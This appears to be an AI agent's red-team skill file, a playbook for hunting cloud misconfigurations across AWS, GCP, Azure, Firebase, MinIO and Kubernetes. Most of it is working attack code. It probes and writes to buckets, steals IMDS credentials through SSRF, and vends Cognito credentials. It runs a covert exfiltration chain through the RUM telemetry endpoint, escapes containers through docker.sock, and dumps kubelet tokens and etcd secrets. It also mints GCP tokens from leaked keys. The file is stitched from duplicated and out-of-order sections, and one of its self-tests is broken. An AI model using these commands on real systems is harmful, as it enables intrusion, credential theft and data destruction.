---
name: hunt-cloud-misconfig
description: "Hunt cloud / infrastructure misconfigurations. AWS: public S3 buckets (s3:GetObject anonymous), permissive bucket policies (PutObjectAcl public-write), exposed CloudFront origin, public Lambda function URL, public RDS snapshot, IAM credentials in JS bundles, AWS metadata accessible via SSRF. GCP: public GCS buckets, exposed Cloud Run services, leaked service account JSON. Azure: public blob containers, exposed Function App. (Kubernetes/Docker exposure is owned by hunt-k8s; CI/CD pipeline attacks by hunt-cicd; post-credential IAM escalation by cloud-iam-deep.) Detection: targeted dorking, certificate transparency, JS bundle secret extraction, port scan for known service ports. Validate: actual data read / write / RCE. Use when hunting cloud-native storage and compute misconfig (S3/GCS/Blob, IMDS-via-SSRF, serverless, public managed services)."
version: 1.1.0
revision_date: 2026-07-25
license: MIT
category: redteam
tags: [cloud, misconfiguration, hunt, redteam]
---

# HUNT-CLOUD-MISCONFIG — Cloud / Infrastructure Misconfigurations

## Crown Jewel Targets

### S3 / GCS / Azure Blob
```bash
# S3 listing
curl --max-time 30 --connect-timeout 10 -s "https://TARGET-NAME.s3.amazonaws.com/?max-keys=10"
aws s3 ls s3://target-bucket-name --no-sign-request

# Try common bucket names
for name in target target-backup target-assets target-prod target-staging; do
  curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "$name: %{http_code}\n" "https://$name.s3.amazonaws.com/"
done

# Firebase open rules
curl --max-time 30 --connect-timeout 10 -s "https://TARGET-APP.firebaseio.com/.json"   # read
curl --max-time 30 --connect-timeout 10 -s -X PUT "https://TARGET-APP.firebaseio.com/test.json" -d '"pwned"'  # write
```

### EC2 Metadata (via SSRF)
```bash
http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/  # role name
http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/ROLE-NAME  # keys
```

### Exposed Admin Panels
```
/jenkins  /grafana  /kibana  /elasticsearch  /swagger-ui.html
/phpMyAdmin  /.env  /config.json  /api-docs  /server-status
```

---

## Local-verificationtoolchain

For testing cloud-misconfig findings against a local AWS sim before/instead of hitting real cloud:

```bash
# LocalStack 3.0 community (pin the version — 4.x requires a Pro license)
docker run -d --name lab-localstack -p 14566:4566 localstack/localstack:3.0

# awscli ≥ 2.30 + LocalStack 3.0 incompatibility workaround (x-amz-trailer header):
export AWS_REQUEST_CHECKSUM_CALCULATION=when_required
export AWS_RESPONSE_CHECKSUM_VALIDATION=when_required
export AWS_ENDPOINT_URL=http://localhost:14566
export AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_DEFAULT_REGION=us-east-1
```

Without those env vars, `aws s3 cp/sync` fails with `InvalidRequest`. Document this for the team. See `docs/verification/phase2j-cloud-localstack.md` for the full reproducible flow.

---

## CloudWatch RUM Weaponization (2024-2026 surface)

AWS CloudWatch RUM (Real-User Monitoring) is a client-side telemetry service launched late 2021. Customers embed a JS snippet on their pages that sends performance/error events to `dataplane.rum.<region>.amazonaws.com`. The snippet's `AppMonitor` config contains an `identityPoolId` (Cognito) and `guestRoleArn` (IAM role) — both **public by design**. The IAM role policy is the security boundary, and when developers leave it broader than the documented minimum (`rum:PutRumEvents` on the AppMonitor ARN), the entire pool becomes the unauthenticated AWS-credential vending machine described in `cloud-iam-deep` → Cognito Identity Pool chain.

### Detection — JS bundle fingerprints

**Snippet-style (most common, embedded in `<head>`):**
```javascript
(function(n,i,v,r,s,c,x,z){...})(
  'cwr',
  '00000000-0000-0000-0000-000000000000',                       // applicationId (UUID)
  '1.0.0',
  'us-east-1',
  'https://client.rum.us-east-1.amazonaws.com/1.x/cwr.js',
  {
    sessionSampleRate: 1,
    guestRoleArn: "arn:aws:iam::123456789012:role/RUM-Monitor-...-Unauth",
    identityPoolId: "us-east-1:abcd1234-...",
    endpoint: "https://dataplane.rum.us-east-1.amazonaws.com",
    telemetries: ["errors","performance","http"]
  }
);
```

**NPM-style (aws-rum-web package):**
```javascript
import { AwsRum, AwsRumConfig } from 'aws-rum-web';
const config: AwsRumConfig = { identityPoolId, endpoint, guestRoleArn, ... };
const awsRum = new AwsRum(APPLICATION_ID, '1.0.0', AWS_REGION, config);
```

### Regex set for recon

```bash
# Detect RUM init
grep -REn "cwr\(['\"]init['\"]|from\s+['\"]aws-rum-web['\"]|new\s+AwsRum\(" .

# Extract applicationId (UUID v4)
grep -ErohE "applicationId['\"]?\s*[:=]\s*['\"]([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})['\"]" .

# Extract identityPoolId (region:UUID)
grep -ErohE "identityPoolId['\"]?\s*[:=]\s*['\"]([a-z]{2}-[a-z]+-[0-9]+:[0-9a-f-]{36})['\"]" .

# Extract guestRoleArn (leaks AWS account ID + role name)
grep -ErohE "guestRoleArn['\"]?\s*[:=]\s*['\"]arn:aws:iam::[0-9]{12}:role/[A-Za-z0-9._/-]+['\"]" .

# Endpoint reveals region
grep -ErohE "dataplane\.rum\.[a-z0-9-]+\.amazonaws\.com" .
```

### Attack chains

**Chain A — Credential extraction (Critical when guestRole is over-permissioned).** Once `identityPoolId` is extracted from the page, anyone runs:

```bash
aws cognito-identity get-id \
  --identity-pool-id "us-east-1:abcd1234-..." \
  --region us-east-1 --no-sign-request
aws cognito-identity get-credentials-for-identity \
  --identity-id "us-east-1:<returned-uuid>" \
  --region us-east-1 --no-sign-request
# → STS creds; export and:
aws sts get-caller-identity        # confirm role
aws s3 ls; aws dynamodb list-tables; aws lambda list-functions; aws ssm describe-parameters; aws secretsmanager list-secrets
# Automate: pacu / enumerate-iam.py
```

Full chain documented in `cloud-iam-deep` → Cognito Identity Pool unauthenticated chain. RUM is one common embedding context.

**Chain B — Telemetry endpoint covert exfil.** `dataplane.rum.<region>.amazonaws.com` is an **AWS-owned domain on every enterprise allowlist**. The `PutRumEvents` payload accepts arbitrary `userDetails` and `customEvents` string fields:

```bash
aws rum put-rum-events \
  --id $(uuidgen) \
  --app-monitor-details '{"id":"<appId>","version":"1.0.0"}' \
  --user-details '{"userId":"EXFIL_PAYLOAD_HERE","sessionId":"<session>"}' \
  --rum-events '[{"id":"'$(uuidgen)'","timestamp":'$(date +%s)',"type":"com.amazon.rum.custom_event","details":"{\"exfil\":\"<base64 of stolen data>\"}"}]' \
  --endpoint-url "https://dataplane.rum.us-east-1.amazonaws.com" \
  --region us-east-1
```

Defenders watching egress see traffic to a known-good AWS hostname; DLP doesn't parse the JSON body; SIEM rules typically don't ingest customer RUM telemetry.

**Chain C — DOM injection via snippet source poisoning.** Many customers either self-host `cwr.js` on their own CDN (`assets.target.com/cwr.js`) or bundle `aws-rum-web` and serve from `static.target.com/main.<hash>.js`. Subdomain takeover on the JS host or supply-chain compromise (npm typosquat against `aws-rum-webb`) gives persistent JS execution on every page-load with the trust of the `aws-rum-web` SDK — including its already-granted Cognito permissions.

**Chain D — Telemetry injection / dashboard poisoning.** With the public `identityPoolId` + `applicationId`, an external attacker can flood `PutRumEvents` with fake error spikes (drown real alerts), inject XSS payloads into page-URL telemetry that fire when an SOC analyst views the CloudWatch dashboard, and inflate billable RUM event counts (financial DoS).

### Severity rubric

| Finding | Severity | Justification |
|---|---|---|
| `guestRoleArn` with `*:*` or wildcards on multiple services | **Critical** (9.1+) | Anonymous full AWS access |
| `guestRoleArn` with `s3:*`, `dynamodb:*`, `secretsmanager:*`, `lambda:Invoke*` on production resources | **High** (7.5-8.8) | Data exfil / RCE depending on resource |
| `guestRoleArn` with `cognito-identity:*` or `iam:PassRole` | **High** (8.0) | Privilege escalation primitive |
| `guestRoleArn` with only `rum:PutRumEvents` + endpoint-scoped resource | **Informational** | Documented, intended config |
| RUM `userDetails` logging PII into events viewable in CloudWatch console | **Medium** (5.3-6.5) | Sensitive data exposure via dashboard sharing |
| RUM AppMonitor accepts `PutRumEvents` from arbitrary internet sources (telemetry injection) | **Low-Medium** (4.3) | Dashboard poisoning, alert evasion, billing DoS |
| Self-hosted `cwr.js` on takeoverable subdomain | **Critical** (9.8) when chained | Persistent stored XSS across every customer page |

### Disclosed cases / authoritative writeups

No CVE assigned specifically to AWS RUM as of 2026-05. The attack class is documented in research but specific named bug-bounty payouts on RUM are rare in public hacktivity. The pattern is "Cognito identity pool over-permission via embedded SDK" — RUM is one common embedding.

- **Andres Riancho — "Misconfigured Cognito Identity Pools" (2020/2023)** — establishes the attack class. [andresriancho.com](https://andresriancho.com/identity-pools-and-the-default-iam-role-trap/)
- **Rhino Security Labs — Pacu `cognito__enum_identity_pools`** — production tooling that automates Chain A. [github.com/RhinoSecurityLabs/pacu](https://github.com/RhinoSecurityLabs/pacu)
- **NotSoSecure / Claranet — "Exploiting weak configurations in Amazon Cognito" (Nov 2023)** — explicitly calls out RUM as one of three SDKs commonly leaking the pool ID. [notsosecure.com](https://www.notsosecure.com/exploiting-weak-configurations-in-amazon-cognito/)
- **HackTricks Cloud — `aws-cognito-unauthenticated-enum`** — canonical playbook. [cloud.hacktricks.wiki](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html)
- **Datadog Security Labs — "Following AWS Logs Backwards: Cognito Identity Pool Abuse" (2024)** — telemetry showing real-world abuse rates. [securitylabs.datadoghq.com](https://securitylabs.datadoghq.com/articles/abusing-aws-cognito-misconfigurations/)
- **aws-observability/aws-rum-web GitHub issues #213, #404** — community discussion of the bundled-snippet security model. [github.com/aws-observability/aws-rum-web](https://github.com/aws-observability/aws-rum-web/issues)

### Validation checklist (before reporting)

1. Extract `identityPoolId` from page source.
2. Confirm pool allows unauth identities (`get-id` succeeds without auth).
3. Confirm `get-credentials-for-identity` returns STS creds.
4. Run `aws sts get-caller-identity` and **screenshot the role ARN**.
5. Run `enumerate-iam` / Pacu `iam__enum_permissions` — capture **at least one allowed action beyond `rum:PutRumEvents`**. Without this, the finding is Informational.
6. Demonstrate at least one read/list against a real resource (S3 bucket list, DynamoDB scan, Lambda invoke).
7. **Do not** modify/delete data even if permitted — read-only PoC only.

---

## Verification

1. **S3 bucket probe** — confirm AWS CLI or curl bucket syntax:
   ```bash
   echo "https://bucket-name.s3.amazonaws.com/" | grep -q "s3.amazonaws.com" && echo "PASS" || echo "FAIL"
   ```
2. **Firebase RTDB probe** — confirm Firebase URL syntax:
   ```bash
   echo "https://project-id.firebaseio.com/.json" | grep -q "firebaseio.com" && echo "PASS" || echo "FAIL"
   ```
3. **Cloud metadata endpoint** — confirm metadata IP recognition:
   ```bash
   echo "192.0.2.1" | grep -q "169.254" && echo "PASS: metadata IP recognized" || echo "FAIL"
   ```
All 3 tests verify cloud misconfig probing.

---

## Pitfalls

- **S3 bucket listing without read access** — finding a listable bucket is recon, not a vulnerability. Need to demonstrate readable objects with sensitive content.
- **Firebase public read without sensitive data** — an open Firebase RTDB with only public app config is informational. Need PII, credentials, or internal data.
- **GCP/Azure storage without credential impact** — public blob storage containing static assets is not a finding. Need secrets, source code, or customer data.
- **Cloud metadata endpoint accessible from outside** — SSRF to 192.0.2.1 is only exploitable from inside the cloud. External access to metadata is a different (and more severe) finding.
- **Bucket ACL misconfig vs policy misconfig** — bucket policies and ACLs are different mechanisms. Test both before concluding the bucket is public.
- **CloudFront/Cloudflare CDN origin leakage** — bypassing CDN to reach the origin is recon until you demonstrate what's different (debug endpoints, auth-less access).
- **Unrestricted cloud function triggers** — publicly-invokable functions may be intentional. Need to demonstrate the function does something sensitive (data access, resource modification).


---

## Related Skills & Chains

- **`hunt-subdomain`** — Stale CNAMEs pointing to deleted buckets are a takeover gold mine. Chain primitive: Cloud misconfig (S3 public/deleted) + `hunt-subdomain` → unclaimed CNAME points to bucket → `assets.target.com` takeover.
- **`cloud-iam-deep`** — A leaked SA JSON / AWS key in a public bucket is only half the bug. Chain primitive: Public S3 + leaked AWS key in `.env` → `cloud-iam-deep` enumeration → cross-service `iam:PassRole` escalation.
- **`hunt-ssrf`** — Metadata service is reachable only from inside the VPC; SSRF is the bridge. Chain primitive: SSRF + cloud misconfig (IMDSv1 still enabled) → instance role keys → S3/RDS data read.
- **`supply-chain-attack-recon`** — Exposed CI/CD endpoints and SBOMs reveal internal package names. Chain primitive: Exposed Jenkins/GitLab + internal package name leak → npm/PyPI dependency-confusion publish → CI build pwn.
- **`security-arsenal`** — Load the Cloud Bucket Wordlist (target-prod / target-backup / target-staging permutations) and the Admin-Panel Path List for fast enumeration.
- **`triage-validation`** — Apply the Unique-Marker gate: any "writable bucket" claim requires a write of a unique marker file and a read-back from a clean session before report submission.



---

## Content from local version



## Local-verification toolchain

For testing cloud-misconfig findings against a local AWS sim before/instead of hitting real cloud:

```bash
# LocalStack 3.0 community (pin the version — 4.x requires a Pro license)
docker run -d --name lab-localstack -p 14566:4566 localstack/localstack:3.0

# awscli ≥ 2.30 + LocalStack 3.0 incompatibility workaround (x-amz-trailer header):
export AWS_REQUEST_CHECKSUM_CALCULATION=when_required
export AWS_RESPONSE_CHECKSUM_VALIDATION=when_required
export AWS_ENDPOINT_URL=http://localhost:14566
export AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_DEFAULT_REGION=us-east-1
```

Without those env vars, `aws s3 cp/sync` fails with `InvalidRequest`. Document this for the team. See `docs/verification/phase2j-cloud-localstack.md` for the full reproducible flow.

---



## MinIO Health Check and Admin API

```bash
# Health check
curl -sI "http://host:9000/minio/health/live"

# Admin API
curl -s "http://host:9000/minio/admin/v3/info"

# Web console login (port 9001)
curl -X POST "http://host:9001/api/v1/login"   -H "Content-Type: application/json"   -d '{"accessKey":"minioadmin","secretKey":"minioadmin"}'

# List bucket objects
curl -s "http://host:9000/bucket-name?list-type=2"

# Upload
curl -X PUT "http://host:9000/bucket-name/file.html"   -H "Content-Type: text/html; charset=utf-8" -d "<h1>Pwned</h1>"
```



## PROJECT_ID Discovery

```python
projects = ["empresa", "empresa-app", "empresa-prod", "empresa-dev",
            "empresa-1", "empresa-12345", "app-empresa", "admin-1a2b3"]
regions = ["us-central1", "us-east1", "southamerica-east1", "europe-west1"]

for proj in projects:
    for region in regions:
        url = f"https://{region}-{proj}.cloudfunctions.net/api/feed?limit=1"
        try:
            r = requests.get(url, timeout=5)
            if r.status_code != 404 and len(r.text) > 20:
                print(f"DONE {url} -> {r.status_code}")
        except:
            pass
```



## Firebase Open SignUp

```bash
curl -s "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$API_KEY"   -H "Content-Type: application/json"   -d '{"email":"attacker@domain.com","password":"Senha123!","returnSecureToken":true}'
```



## Cloud Run Service Listing

```javascript
const {v2} = require('@google-cloud/run');
const client = new v2.ServicesClient({credentials: sa});
const [services] = await client.listServices({
    parent: 'projects/' + projectId + '/locations/us-central1'
});
for (const svc of services) {
    console.log(svc.name, svc.uri, svc.ingress);
}
```



## Service Account Key -> GCP Token Generation

```python
import json, base64, time, requests
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding as pad
from cryptography.hazmat.backends import default_backend

def get_gcp_token(sa_key):
    """Generates a GCP access token from an SA key."""
    now = int(time.time())
    header = base64.urlsafe_b64encode(
        json.dumps({"alg":"RS256","typ":"JWT"}).encode()
    ).rstrip(b'=').decode()
    claims = {
        "iss": sa_key['client_email'],
        "scope": "https://www.googleapis.com/auth/cloud-platform",
        "aud": sa_key['token_uri'],
        "iat": now,
        "exp": now + 3600
    }
    payload = base64.urlsafe_b64encode(json.dumps(claims).encode()).rstrip(b'=').decode()
    key = load_pem_private_key(
        sa_key['private_key'].encode(), password=None, backend=default_backend()
    )
    signature = base64.urlsafe_b64encode(
        key.sign(f'{header}.{payload}'.encode(), pad.PKCS1v15(), hashes.SHA256())
    ).rstrip(b'=').decode()

    resp = requests.post(sa_key['token_uri'],
        data=f'grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion={header}.{payload}.{signature}'.encode(),
        headers={'Content-Type':'application/x-www-form-urlencoded'}, timeout=10)
    return resp.json()['access_token']

# List IAM policy (find owners/admins)
r = requests.get(
    f'https://cloudresourcemanager.googleapis.com/v1/projects/{project_id}:getIamPolicy',
    headers={'Authorization': f'Bearer {token}'}
)
for binding in r.json().get('bindings', []):
    if binding['role'] in ['roles/owner', 'roles/editor']:
        print(f"ROLE {binding['role']}: {binding['members']}")

# List Storage buckets
r = requests.get(
    f'https://storage.googleapis.com/storage/v1/b?project={project_id}',
    headers={'Authorization': f'Bearer {token}'}
)
for bucket in r.json().get('items', []):
    print(f"BUCKET {bucket['name']}")

# Test Firestore access
r = requests.get(
    f'https://firestore.googleapis.com/v1/projects/{project_id}/databases/(default)/documents',
    headers={'Authorization': f'Bearer {token}'}
)
if r.status_code == 200:
    print("FIRESTORE ACCESSIBLE")
```



## Azure Blob Storage Testing

```bash
# URL pattern: https://{storage_account}.blob.core.windows.net/{container}
curl -s "https://storageaccount.blob.core.windows.net/container?restype=container&comp=list"
```



## Chain Table

| K8s finding | Chain to | Impact |
|-------------|----------|--------|
| API anon **with confirmed secret read** | extract SA/TLS/app creds | Full cluster compromise |
| `nodes/proxy` token | API-server-mediated `/run` → pod RCE → SA token | Node-wide RCE → escalation |
| Kubelet 10250 `/run` | exec in any pod → steal SA token → API | Cluster privilege escalation |
| etcd 2379 unauth | dump all Secrets (if unencrypted) → replay token | Full credential dump |
| docker.sock | privileged container + host bind-mount | Host root |
| CVE-2024-21626 (runc) | malicious image/exec → host FD escape | Container → host root |
| EphemeralContainers / pods create | privileged/hostPID debug container | Pod → node escape |
| Projected SA token (aud matches) | API access scoped to its real RBAC | Depends on RBAC — verify first |
| Tiller 44134 exposed | helm install as Tiller SA | Cluster-admin if Tiller is privileged |




## When to Use

- After finding Firebase API keys, Supabase keys, or GCP SA keys
- When a target uses serverless (Cloud Functions, Cloud Run)
- After finding S3 bucket names or MinIO instances
- One SA key can escalate to full cloud access



## Phase 7 — Docker Socket Exposure & runc Container Escape

```bash
# docker.sock reachable (SSRF unix://, LFI of socket, or RCE on host)
curl -s --unix-socket /var/run/docker.sock http://localhost/v1.41/info
curl -s --unix-socket /var/run/docker.sock http://localhost/v1.41/containers/json

# Privileged container bind-mounting host root → read/write host fs (host escape)
curl -s --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' \
  -X POST http://localhost/v1.41/containers/create?name=poc \
  -d '{"Image":"alpine","Cmd":["cat","/host/etc/hostname"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/poc/start
curl -s --unix-socket /var/run/docker.sock "http://localhost/v1.41/containers/poc/logs?stdout=1"
# Impact proof = the NODE's /etc/hostname (differs from the container's hostname).
```

**Container-escape CVEs (gate on runc/version):**
- **CVE-2024-21626 — "Leaky Vessels" (runc ≤ 1.1.11):** a leaked host file descriptor via `/proc/self/fd/<n>` lets a malicious image (`WORKDIR /proc/self/fd/N`) or `runc exec` cwd escape to the host filesystem → host RCE. Test only with an image you control on a build/registry surface where you can influence the Dockerfile.
- **CVE-2019-5736 (runc):** overwrite the host `/proc/self/exe` (the runc binary) from inside a container you can exec into → host root on next runc invocation. Applies to very old runc.
- **CVE-2022-0492 (cgroups v1 `release_agent`):** a container with `CAP_SYS_ADMIN` (or able to mount cgroupfs) writes a `release_agent` that executes on the host → escape. Check container caps first.




## Cloud Functions URL Patterns (GCP)

```
https://{REGION}-{PROJECT_ID}.cloudfunctions.net/{FUNCTION_NAME}
https://us-central1-{PROJECT_ID}.cloudfunctions.net/api/feed
```



## Phase 5 — etcd Unauth (Port 2379)

```bash
# etcd holds ALL cluster state. Secrets are plaintext UNLESS EncryptionConfiguration is set.
ETCDCTL_API=3 etcdctl --endpoints=http://$TARGET:2379 get / --prefix --keys-only 2>/dev/null | head -50
ETCDCTL_API=3 etcdctl --endpoints=http://$TARGET:2379 \
  get /registry/secrets --prefix 2>/dev/null | strings | grep -Ei 'token|password|tls.key|dockerconfig' | head -40

# HTTP/JSON gateway (key/range are base64; "Lw==" == "/")
curl -s "http://$TARGET:2379/v3/kv/range" -H 'Content-Type: application/json' \
  -d '{"key":"L3JlZ2lzdHJ5L3NlY3JldHM=","range_end":"L3JlZ2lzdHJ5L3NlY3JldHQ=","limit":20}' | python3 -m json.tool

# v2 (older clusters)
curl -s "http://$TARGET:2379/v2/keys/?recursive=true" | python3 -m json.tool 2>/dev/null | head
```
A recovered SA token from etcd → replay against the API server (Phase 6) to confirm grants. **False positive:** a `200` from etcd peer port `2380` or a TLS-required port returning a handshake error is not unauth client access — only a successful `range`/`get` with key data is.




## Testing HTTP Methods Without Auth

```python
methods = {
    "GET": requests.get,
    "POST": lambda u: requests.post(u, json={"test": "test"}),
    "PUT": lambda u: requests.put(u, json={"test": "test"}),
    "DELETE": lambda u: requests.delete(u),
}

for method_name, method_func in methods.items():
    try:
        r = method_func(url)
        if r.status_code not in [401, 403, 404, 405]:
            print(f"WARN {method_name} {url} -> {r.status_code} (ACCEPTED!)")
    except:
        pass
```

**Real-world case (CRITICAL)**: 6 Cloud Functions from fitness tech platform:
- GET without auth -- dump of 15,800+ posts, 389+ users, real student data
- DELETE without auth -- confirmed destruction of production data
- Reflected CORS on ALL 6 functions -- drive-by attack possible
- 705 PDF tokens leaked



## S3 Bucket Enumeration and Upload Testing

```bash
# Test if bucket is public
curl -s "http://bucket-name.s3.amazonaws.com/"

# Upload (if writable)
curl -X PUT "http://bucket-name.s3.amazonaws.com/test.txt"   -H "Content-Type: text/plain" -d "pwned"

# Test common bucket names
for b in "target" "target-prod" "target-dev" "target-images" "target-uploads"          "target-backup" "target-media" "download.target.com" "static.target.com"; do
  r=$(curl -sk -o /dev/null -w "%{http_code}" "https://$b.s3.amazonaws.com/" 2>/dev/null)
  [ "$r" != "404" ] && echo "$b -> HTTP $r"
done
```



## Phase 3 — Kubelet (Port 10250) — `/run` First, `/exec` Done Right

The earlier version of this skill sent `/exec` as a plain `POST` and expected `id` output back. **That is wrong.** `/exec` is a SPDY/WebSocket *streaming* endpoint: a plain POST returns a **302 redirect to a stream location** (e.g. `/cri/exec/<token>`) that you then must read with a SPDY/WebSocket client. An operator who runs the old curl sees nothing and wrongly concludes the kubelet is patched.

```bash
SRV="https://$TARGET:10250"

# Enumerate pods (auth varies; many kubelets allow anonymous read here)
curl -sk "$SRV/pods" | python3 -m json.tool 2>/dev/null \
  | grep -E '"namespace"|"name"|"containerName"' | head -40

NS=default; POD=target-pod; CTR=app

# --- PRIMITIVE A: /run — returns command output DIRECTLY (no stream handling) ---
# This is the simple correct primitive. Use this first.
curl -sk -X POST "$SRV/run/$NS/$POD/$CTR" -d "cmd=id"
curl -sk -X POST "$SRV/run/$NS/$POD/$CTR" -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"

# --- PRIMITIVE B: /exec — SPDY/WebSocket stream, NOT a plain POST ---
# Option 1: kubeletctl handles the stream transport for you (recommended)
#   kubeletctl --server $TARGET exec "id" -p $POD -c $CTR -n $NS
#   kubeletctl --server $TARGET scan rce         # finds every exec-able pod
# Option 2: raw — the POST returns a 302 to a stream path; -v to see Location, then
#   read it with a SPDY3.1/WebSocket client (wscat / websocat), e.g.:
#   curl -sk -i -X POST "$SRV/exec/$NS/$POD/$CTR?command=id&input=1&output=1&tty=0"   # shows 302 Location
#   websocat -k "wss://$TARGET:10250/cri/exec/<token-from-Location>"

# Container logs (read-only, no stream)
curl -sk "$SRV/containerLogs/$NS/$POD/$CTR"

# Read-only kubelet 10255 — INFO DISCLOSURE ONLY, no exec/run. Do not call this "RCE".
curl -s "http://$TARGET:10255/pods" | python3 -m json.tool 2>/dev/null | head
curl -s "http://$TARGET:10255/metrics" | head
```

**CVE-2020-8558** (host-network trust): on affected kube-proxy, services bound to the node's `127.0.0.1` (incl. the read-only kubelet and other localhost-only services) become reachable from other pods/adjacent hosts via the node IP, defeating the localhost trust boundary — a lateral path to kubelet/etcd that were assumed loopback-only.




## Phase 1 — Fingerprint & Port Discovery

```bash
# Common Kubernetes / container ports
PORTS="443,6443,8443,8080,10250,10255,10256,2379,2380,4194,9090,9100,30000-30010"
nmap -sV -p $PORTS $TARGET 2>/dev/null | grep open

# API server fingerprint — the /version endpoint is anonymous on most clusters
curl -sk "https://$TARGET:6443/version"        # {"major":"1","minor":"29","gitVersion":"v1.29.x"...}
curl -sk "https://$TARGET:6443/api"             # APIVersions list, even pre-auth
curl -sk "https://$TARGET:6443/healthz"

# Cloud metadata pivot (reach K8s SA / node creds from an SSRF foothold)
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/" # AWS EKS (IMDSv1)
TOK=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60") # IMDSv2
curl -s -H "X-aws-ec2-metadata-token: $TOK" "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl -s "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true"      # Azure AKS
curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" # GKE
```
Note the `gitVersion` — it gates every CVE below.




## Firestore Public Access Test

```bash
curl -s "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/users?key=$API_KEY"
curl -s "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/stores?key=$API_KEY"

# Test WRITE
curl -X PATCH "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/stores/ID?updateMask.fieldPaths=fieldName"   -H "Content-Type: application/json"   -d '{"fields":{"fieldName":{"stringValue":"test"}}}'
```

**Real-world case (CRITICAL)**: Delivery platform -- 3 Firebase projects:
- 4,000 stores (CNPJ, GPS, phone, menu) + PATCH write confirmed
- 204K WhatsApp conversations, 173K customer phone numbers
- 1K+ public MP3 audio files in Storage



## Artifact Registry Image Download and Analysis

```python
# List repositories
r = requests.get(
    f'https://artifactregistry.googleapis.com/v1/projects/{project}/locations/{region}/repositories',
    headers={'Authorization': f'Bearer {token}'}
)

# Download specific image manifest
digest = "sha256:XXXXX"
r = requests.get(
    f'https://{region}-docker.pkg.dev/v2/{project}/{repo}/{image}/manifests/{digest}',
    headers={'Authorization': f'Bearer {token}',
             'Accept': 'application/vnd.docker.distribution.manifest.v2+json'}
)

# Download layers
for i, layer in enumerate(r.json().get('layers', [])):
    r2 = requests.get(
        f'https://{region}-docker.pkg.dev/v2/{project}/{repo}/{image}/blobs/{layer["digest"]}',
        headers={'Authorization': f'Bearer {token}'}
    )
    with open(f'/tmp/layer_{i}.tar.gz', 'wb') as f:
        f.write(r2.content)

# Extract and search for secrets
# tar -xzf layer.tar.gz
# grep -r "MIGRATION_TOKEN|APP_KEY|DB_PASSWORD" .
```



## Source Code Buckets (gcf-sources-*)

```
gcf-sources-{PROJECT_NUMBER}-{REGION}
gcf-v2-sources-{PROJECT_NUMBER}-{REGION}
```

With SA key read permission:
```javascript
const {Storage} = require('@google-cloud/storage');
const storage = new Storage({credentials: sa});
const bucket = storage.bucket('gcf-sources-706681009423-us-central1');
const [files] = await bucket.getFiles();
for (const f of files.filter(f => f.name.endsWith('.zip'))) {
    await f.download({destination: '/tmp/' + f.name.replace(/\//g, '_')});
}
```



## MDPsec Verified Patterns (real cross-tenant cloud reports)

Real-world primitives from mdpsec.com reports:

1. **KMS encrypt/decrypt without role guard** — `POST /kms/encrypt` + `/kms/decrypt` proxy straight to cloud KMS under a **single global CMK with no EncryptionContext**; every sibling endpoint returns 403 for tenant tokens. Proofs: (a) ciphertext always begins with identical ~50-char prefix encoding the CMK id (shared key fingerprint); (b) AWS KMS refuses Decrypt when original Encrypt bound a context unless matching one supplied — decrypt succeeding with no context proves none was bound (20, 29). Tenant A encrypts → Tenant B decrypts → victim's clientSecret byte-for-byte; exchange via client_credentials → victim tenant session.
2. **SSRF→IMDSv1 credential theft via body-stored fetch** — `externalUrl` param fetched server-side, response body stored as downloadable attachment; IMDSv1 reachable over plain HTTP (no session token); `GET` attachment = live AWS access key + secret + token (90). Repeatable — metadata rotates creds.
3. **302 redirect flips POST→GET against metadata** — endpoint only sends POST; external redirect service 302 → server follows → GET against IMDS → reflected identity doc (account ID, instance ID, region, private IP) (104).
4. **Signed credential headers leaked on outbound** — search/dataset worker signs every outbound request with cloud credential headers (temp access key + session token) → attacker listener receives them; decode owning production account id (97).
5. **Connector TLS key disclosure to read-only users** — `db.trust.certificate.path` → raw key in task trace; read_only project members read it; bypasses systemd InaccessiblePaths (105).
6. **SQL functions bypass egress filter to metadata** — cloud DB console `RemoteCatalog` engine: `SETTINGS catalog_type='cloud_catalog', metadata_service='metadata.internal', service_account='default'` → live Google OAuth2 token for production data-plane SA leaves in request headers; Azure `objectStorage()` → pod managed identity → Microsoft Entra token (15).

Cross-ref `mdpsec-report-knowledge` for the full index.

## Validation Checklist

- [ ] **API anon:** SelfSubjectRulesReview shows privileged verbs AND a real Secret value was read (redacted).
- [ ] **Kubelet:** literal `id`/`hostname` output returned from 10250 `/run`, or a completed `/exec` stream — not a bare 302.
- [ ] **nodes/proxy RCE:** command output returned through `/api/v1/nodes/<node>/proxy/run/...` with your token.
- [ ] **etcd:** decoded Secret bytes shown (proves unencrypted + readable), not just a key listing.
- [ ] **docker.sock / escape:** the NODE's host file content retrieved (distinct from container), or runc-escape PoC output.
- [ ] **SA token:** `aud`/`exp` decoded and shown valid; impact bounded to its real RBAC.
- [ ] **OOB:** any outbound/SSRF hop confirmed via Collaborator/interactsh subdomain.

**Severity:**
- API anon→secret read, kubelet/nodes-proxy RCE, etcd dump, docker.sock/runc escape, CVE-2018-1002105: **Critical**
- Dashboard token-less data access, exposed Tiller: **High**
- Read-only kubelet 10255, anon `/version`/`/pods` info disclosure: **Medium**